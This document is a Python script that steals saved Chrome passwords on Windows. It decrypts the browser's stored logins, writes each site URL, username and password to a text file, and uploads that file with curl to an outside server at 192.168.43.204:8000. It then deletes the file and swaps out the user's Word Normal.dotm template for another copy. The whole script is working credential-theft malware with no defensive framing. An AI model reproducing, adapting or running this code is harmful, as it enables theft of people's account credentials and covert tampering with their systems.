#Python program to extract all the stored Chrome passwords
#python standard modules
import os
import json
import base64
import sqlite3
import shutil
import shutil
from datetime import timezone, datetime, timedelta
from sys import argv

#3rd party modules
import win32crypt
from Crypto.Cipher import AES

def my_chrome_datetime(time_in_mseconds):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

def encryption_key():

    #C:\Users\USER_Name\AppData\Local\Google\Chrome\Local State
    localState_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    #read local state file
    with open(localState_path, "r", encoding="utf-8") as file:
        local_state_file = file.read()
        local_state_file = json.loads(local_state_file)

    # decode the key and remove first 5 DPAPI str characters
    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]

    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decryted key

def decrypt_password(enc_password, key):
    try:

        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]

        # initialize cipher object
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        # decrypt password
        return cipher.decrypt(enc_password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords(logged in with Social Account)"


def main():
    uname = os.getlogin()
    # local passwords path
    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")

    #copy the login data file to current directory as "my_chrome_data.db
    shutil.copyfile(password_db_path,"my_chrome_data.db")

    # connect to the database
    db = sqlite3.connect("my_chrome_data.db")
    cursor = db.cursor()

    # run the query
    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")

    #get the encryption key
    encp_key = encryption_key()
    #print("\n|","-"*50, "|\n")
    # iterate over all rows
    for row in cursor.fetchall():
        site_url = row[0]
        username = row[1]
        password = decrypt_password(row[2], encp_key)
        date_created = row[3]

        if username or password:
            with open("C:/Users/" + uname + "/config.txt", "a") as o:
                o.write(site_url + '\n')
                o.write(username + '\n')
                o.write(password + '\n') 
            
        else:
            continue
        if date_created:
            print("Date date_created:", str(my_chrome_datetime(date_created)))
        #print("\n|","-"*50, "|\n")

    cursor.close()
    db.close()

    #remove the copied database after reading passwords
    os.remove("my_chrome_data.db")

    os.system("curl http://192.168.43.204:8000 --upload-file C:/Users/" + uname + "/config.txt")

    os.remove("C:/Users/" + uname + "/config.txt")

    dpath = "C:/temp/Normal.dotm"
    fpath = "C:/Users/User/AppData/Roaming/Microsoft/Templates/Normal.dotm"

    os.remove('C:/Users/User/AppData/Roaming/Microsoft/Templates/Normal.dotm')

    shutil.copyfile(dpath, fpath)

    #os.remove("chrome.exe") 
    #Traceback (most recent call last):
    #File "chrome.py", line 105, in <module>
    #File "chrome.py", line 101, in main
    #PermissionError: [WinError 5] Access is denied: 'chrome.exe'


if __name__ == "__main__":
    main()

    #for file upload: curl http://192.168.43.204:8000 --upload-file file.txt